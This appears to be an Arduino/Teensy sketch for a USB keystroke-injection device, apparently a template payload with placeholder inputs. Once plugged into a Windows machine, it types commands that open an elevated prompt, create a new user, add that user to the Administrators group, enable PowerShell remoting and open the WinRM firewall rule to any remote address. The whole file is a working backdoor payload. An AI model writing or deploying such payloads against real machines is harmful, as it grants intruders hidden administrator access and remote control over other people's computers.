#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

# define PAYLOAD_USER_ADD "net user INPUT0 INPUT1 /add"
# define PAYLOAD_GROUP_ADD "net localgroup Administrators INPUT0 /add"

void setup(){
 delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }
add_user();
Keyboard.println("powershell.exe Enable-PSRemoting -SkipNetworkProfileCheck -Force;Set-NetFirewallRule –Name \"WINRM-HTTP-In-TCP-PUBLIC\" –RemoteAddress Any");
delay(2000);
Keyboard.println("exit");
}

void loop(){
}

void add_user(){
delay(2000);
Keyboard.println(PAYLOAD_USER_ADD);
delay(2000);
Keyboard.println(PAYLOAD_GROUP_ADD);
delay(1000);

}

DEFS